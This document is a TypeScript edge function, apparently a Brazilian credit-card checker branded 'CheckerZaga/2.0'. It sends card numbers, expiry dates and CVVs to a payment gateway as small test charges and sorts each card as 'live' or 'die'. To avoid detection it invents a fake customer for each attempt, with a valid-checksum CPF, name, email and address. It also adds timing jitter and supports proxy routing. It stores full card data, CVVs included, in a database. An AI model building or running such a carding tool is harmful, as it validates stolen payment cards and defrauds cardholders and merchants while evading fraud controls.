import { serve } from 'https://deno.land/std@0.168.0/http/server.ts';
import { createClient } from 'https://esm.sh/@supabase/supabase-js@2';

const corsHeaders = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'authorization, x-client-info, apikey, content-type',
};

interface TestCardRequest {
    sessionId: string;
    cardNumber: string;
    expMonth: string;
    expYear: string;
    cvv: string;
    gatewayUrl?: string; // Opcional - usa APPMAX_API_URL se não fornecido
    processingOrder: number;
    amount?: number;
    proxyUrl?: string;
}

// ========================================
// GERAÇÃO DE DADOS ÚNICOS (Anti-Bloqueio)
// ========================================

// Gerar CPF válido com dígitos verificadores corretos
function generateCPF(): string {
    const randomDigit = () => Math.floor(Math.random() * 10);
    const cpf = Array.from({ length: 9 }, randomDigit);

    // Calcular primeiro dígito verificador
    let sum = 0;
    for (let i = 0; i < 9; i++) {
        sum += cpf[i] * (10 - i);
    }
    let remainder = sum % 11;
    const digit1 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit1);

    // Calcular segundo dígito verificador
    sum = 0;
    for (let i = 0; i < 10; i++) {
        sum += cpf[i] * (11 - i);
    }
    remainder = sum % 11;
    const digit2 = remainder < 2 ? 0 : 11 - remainder;
    cpf.push(digit2);

    return cpf.join('');
}

// Nomes brasileiros comuns para geração realista
const firstNames = [
    'João', 'Maria', 'José', 'Ana', 'Pedro', 'Juliana', 'Carlos', 'Fernanda',
    'Paulo', 'Mariana', 'Lucas', 'Beatriz', 'Rafael', 'Camila', 'Felipe',
    'Amanda', 'Bruno', 'Larissa', 'Rodrigo', 'Gabriela', 'Thiago', 'Letícia'
];

const lastNames = [
    'Silva', 'Santos', 'Oliveira', 'Souza', 'Lima', 'Costa', 'Ferreira',
    'Rodrigues', 'Almeida', 'Nascimento', 'Pereira', 'Carvalho', 'Ribeiro',
    'Martins', 'Rocha', 'Alves', 'Monteiro', 'Mendes', 'Barros', 'Freitas'
];

const emailDomains = ['gmail.com', 'hotmail.com', 'outlook.com', 'yahoo.com.br', 'uol.com.br'];

const streets = [
    'Rua das Flores', 'Av. Paulista', 'Rua Augusta', 'Rua Oscar Freire',
    'Av. Brasil', 'Rua XV de Novembro', 'Av. Atlântica', 'Rua da Consolação'
];

const cities = [
    { name: 'São Paulo', state: 'SP', ddd: '11' },
    { name: 'Rio de Janeiro', state: 'RJ', ddd: '21' },
    { name: 'Belo Horizonte', state: 'MG', ddd: '31' },
    { name: 'Brasília', state: 'DF', ddd: '61' },
    { name: 'Salvador', state: 'BA', ddd: '71' },
    { name: 'Fortaleza', state: 'CE', ddd: '85' },
    { name: 'Curitiba', state: 'PR', ddd: '41' },
    { name: 'Porto Alegre', state: 'RS', ddd: '51' }
];

// Gerar dados de cliente únicos e realistas
function generateCustomerData() {
    const firstName = firstNames[Math.floor(Math.random() * firstNames.length)];
    const lastName = lastNames[Math.floor(Math.random() * lastNames.length)];
    const randomNum = Math.floor(Math.random() * 9000) + 1000;
    const domain = emailDomains[Math.floor(Math.random() * emailDomains.length)];
    const city = cities[Math.floor(Math.random() * cities.length)];
    const street = streets[Math.floor(Math.random() * streets.length)];

    const emailName = `${firstName.toLowerCase()}.${lastName.toLowerCase()}${randomNum}`;

    return {
        firstname: firstName,
        lastname: lastName,
        email: `${emailName}@${domain}`,
        telephone: `${city.ddd}9${Math.floor(10000000 + Math.random() * 90000000)}`,
        document_number: generateCPF(),
        address: {
            street: street,
            number: Math.floor(Math.random() * 999) + 1,
            complement: Math.random() > 0.5 ? `Apto ${Math.floor(Math.random() * 200) + 1}` : '',
            neighborhood: 'Centro',
            city: city.name,
            state: city.state,
            zipcode: `${Math.floor(10000 + Math.random() * 90000)}-${Math.floor(100 + Math.random() * 900)}`
        }
    };
}

// Sleep com jitter para comportamento mais humano
function sleep(ms: number): Promise<void> {
    const jitter = Math.random() * 500; // Adiciona 0-500ms de variação
    return new Promise(resolve => setTimeout(resolve, ms + jitter));
}

// Retry com exponential backoff
async function retryWithBackoff<T>(
    operation: () => Promise<T>,
    maxRetries: number = 3,
    baseDelay: number = 1000
): Promise<T> {
    let lastError: Error | null = null;

    for (let attempt = 0; attempt <= maxRetries; attempt++) {
        try {
            return await operation();
        } catch (error) {
            lastError = error as Error;

            if (attempt < maxRetries) {
                const delay = baseDelay * Math.pow(2, attempt); // Exponential backoff
                console.log(`Retry attempt ${attempt + 1}/${maxRetries} after ${delay}ms`);
                await sleep(delay);
            }
        }
    }

    throw lastError;
}

// Detectar bandeira do cartão
function detectCardBrand(bin: string): string {
    if (bin.startsWith('4')) return 'Visa';
    if (bin >= '51' && bin <= '55') return 'Mastercard';
    if (bin.startsWith('34') || bin.startsWith('37')) return 'Amex';
    if (bin.startsWith('6011') || (bin >= '644' && bin <= '649') || bin.startsWith('65')) return 'Discover';
    if (bin >= '3528' && bin <= '3589') return 'JCB';
    if (bin.startsWith('50') || (bin >= '56' && bin <= '69')) return 'Maestro';
    return 'Unknown';
}

// ========================================
// TESTE NO GATEWAY
// ========================================

async function testCardOnGateway(
    cardData: TestCardRequest,
    gatewayUrl: string,
    clientIP: string
): Promise<{ status: 'live' | 'die' | 'unknown'; amount?: number; message: string; responseTimeMs: number; customerData?: any }> {
    const startTime = Date.now();

    try {
        // Gerar dados únicos de cliente para cada transação
        const customerData = generateCustomerData();
        const bin = cardData.cardNumber.substring(0, 6);
        const brand = detectCardBrand(bin);

        console.log(`🎭 Cliente gerado: ${customerData.firstname} ${customerData.lastname} (${customerData.email})`);
        console.log(`💳 Cartão: ${brand} ${bin}****`);

        // PAYLOAD PARA APPMAX
        const payload = {
            // Dados do cartão
            card: {
                number: cardData.cardNumber,
                holder_name: `${customerData.firstname} ${customerData.lastname}`.toUpperCase(),
                exp_month: cardData.expMonth,
                exp_year: cardData.expYear,
                cvv: cardData.cvv,
                brand: brand
            },
            // Dados do cliente (únicos por transação)
            customer: {
                firstname: customerData.firstname,
                lastname: customerData.lastname,
                email: customerData.email,
                telephone: customerData.telephone,
                document_number: customerData.document_number,
                ip: clientIP
            },
            // Endereço
            billing_address: customerData.address,
            // Valor da transação
            amount: cardData.amount || 1.00,
            // Metadados
            metadata: {
                session_id: cardData.sessionId,
                processing_order: cardData.processingOrder,
                checker: 'CheckerZaga/2.0'
            }
        };

        // Headers com User-Agent realista
        const fetchOptions: RequestInit = {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
                'User-Agent': 'CheckerZaga/2.0 (Anti-Bloqueio Ativo)',
                'X-Client-IP': clientIP,
                'Authorization': `Bearer ${Deno.env.get('APPMAX_ACCESS_TOKEN') || ''}` // Token do Supabase
            },
            body: JSON.stringify(payload)
        };

        // Handle Proxy
        let targetUrl = gatewayUrl;
        if (cardData.proxyUrl) {
            if (cardData.proxyUrl.includes('url=')) {
                targetUrl = `${cardData.proxyUrl}${encodeURIComponent(gatewayUrl)}`;
            } else {
                console.warn('Standard proxy URL provided. Deno native fetch might not route through this without custom agent.');
            }
        }

        // Realizar requisição com retry
        const response = await retryWithBackoff(async () => {
            return await fetch(targetUrl, fetchOptions);
        }, 3, 1000);

        const responseTimeMs = Date.now() - startTime;

        // Parse response
        let responseData;
        const contentType = response.headers.get('content-type');
        if (contentType && contentType.includes('application/json')) {
            responseData = await response.json();
        } else {
            responseData = await response.text();
        }

        // ANÁLISE DETALHADA DE RESPOSTA
        const responseString = JSON.stringify(responseData).toLowerCase();

        let status: 'live' | 'die' | 'unknown' = 'die';
        let message = 'Declined';
        let amount = cardData.amount;

        // Padrões de aprovação
        if (responseString.includes('approved') ||
            responseString.includes('sucesso') ||
            responseString.includes('authorized') ||
            responseString.includes('aprovado')) {
            status = 'live';
            message = '✅ Approved - Card is LIVE';
        }
        // Padrões de recusa (mas cartão válido)
        else if (responseString.includes('insufficient') ||
            responseString.includes('sem saldo') ||
            responseString.includes('limit exceeded') ||
            responseString.includes('saldo insuficiente')) {
            status = 'live'; // Cartão válido, apenas sem saldo
            message = '💰 Insufficient Funds (Card Valid)';
        }
        // Padrões de cartão inválido
        else if (responseString.includes('invalid') ||
            responseString.includes('incorreto') ||
            responseString.includes('expired') ||
            responseString.includes('expirado') ||
            responseString.includes('blocked') ||
            responseString.includes('bloqueado')) {
            status = 'die';
            message = '❌ Invalid/Expired/Blocked';
        }
        // Erros de gateway/sistema
        else if (responseString.includes('error') ||
            responseString.includes('erro') ||
            responseString.includes('timeout') ||
            responseString.includes('failed')) {
            status = 'unknown';
            message = '⚠️ Gateway Error / Timeout';
        }
        // Resposta HTTP mas sem padrão reconhecido
        else {
            if (response.ok) {
                status = 'die';
                message = `Declined (HTTP ${response.status})`;
            } else {
                status = 'unknown';
                message = `HTTP Error ${response.status}`;
            }
        }

        console.log(`⏱️ Response time: ${responseTimeMs}ms - Status: ${status}`);

        return {
            status,
            amount,
            message: typeof responseData === 'string' ? responseData.substring(0, 200) : message,
            responseTimeMs,
            customerData: {
                email: customerData.email,
                cpf: customerData.document_number
            }
        };

    } catch (error) {
        const responseTimeMs = Date.now() - startTime;
        console.error('❌ Request failed:', error.message);

        return {
            status: 'unknown',
            message: `Request Failed: ${error.message}`,
            responseTimeMs
        };
    }
}

// ========================================
// MAIN HANDLER
// ========================================

serve(async (req) => {
    if (req.method === 'OPTIONS') {
        return new Response('ok', { headers: corsHeaders });
    }

    try {
        const supabaseClient = createClient(
            Deno.env.get('SUPABASE_URL') ?? '',
            Deno.env.get('SUPABASE_SERVICE_ROLE_KEY') ?? ''
        );

        const requestData: TestCardRequest = await req.json();
        const {
            sessionId,
            cardNumber,
            expMonth,
            expYear,
            cvv,
            gatewayUrl,
            processingOrder,
            amount,
            proxyUrl
        } = requestData;

        // Validação
        if (!sessionId || !cardNumber || !expMonth || !expYear || !cvv || processingOrder === undefined) {
            return new Response(
                JSON.stringify({ error: 'Missing required fields' }),
                { status: 400, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
            );
        }

        // Usar APPMAX_API_URL do Supabase se gatewayUrl não fornecido
        const finalGatewayUrl = gatewayUrl || Deno.env.get('APPMAX_API_URL') || '';

        if (!finalGatewayUrl) {
            return new Response(
                JSON.stringify({ error: 'Gateway URL not configured. Please set APPMAX_API_URL in Supabase secrets.' }),
                { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
            );
        }

        console.log(`🔗 Using Gateway: ${finalGatewayUrl}`);

        // Obter IP real do cliente
        const clientIP = req.headers.get('x-forwarded-for') ||
            req.headers.get('x-real-ip') ||
            '127.0.0.1';

        console.log(`🌐 Client IP: ${clientIP}`);

        // Testar cartão no gateway
        const testResult = await testCardOnGateway(
            { sessionId, cardNumber, expMonth, expYear, cvv, gatewayUrl: finalGatewayUrl, processingOrder, amount, proxyUrl },
            finalGatewayUrl,
            clientIP
        );

        // Armazenar resultado no Supabase
        const { data, error } = await supabaseClient
            .from('card_test_results')
            .insert([
                {
                    session_id: sessionId,
                    card_number: cardNumber, // Consider masking: `${cardNumber.substring(0, 6)}******${cardNumber.slice(-4)}`
                    exp_month: expMonth,
                    exp_year: expYear,
                    cvv: cvv, // Consider NOT storing this
                    gateway_url: finalGatewayUrl,
                    processing_order: processingOrder,
                    status: testResult.status,
                    message: testResult.message,
                    amount: testResult.amount,
                    response_time_ms: testResult.responseTimeMs,
                    customer_email: testResult.customerData?.email || null,
                    customer_cpf: testResult.customerData?.cpf || null
                },
            ]);

        if (error) {
            console.error('❌ Error storing test result:', error);
            return new Response(
                JSON.stringify({ error: 'Failed to store test result', details: error.message }),
                { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
            );
        }

        console.log('✅ Result stored successfully');

        return new Response(
            JSON.stringify({
                success: true,
                testResult: {
                    status: testResult.status,
                    message: testResult.message,
                    responseTimeMs: testResult.responseTimeMs
                },
                storedData: data
            }),
            { status: 200, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );

    } catch (error) {
        console.error('💥 Request processing error:', error);
        return new Response(
            JSON.stringify({ error: error.message }),
            { status: 500, headers: { 'Content-Type': 'application/json', ...corsHeaders } }
        );
    }
});
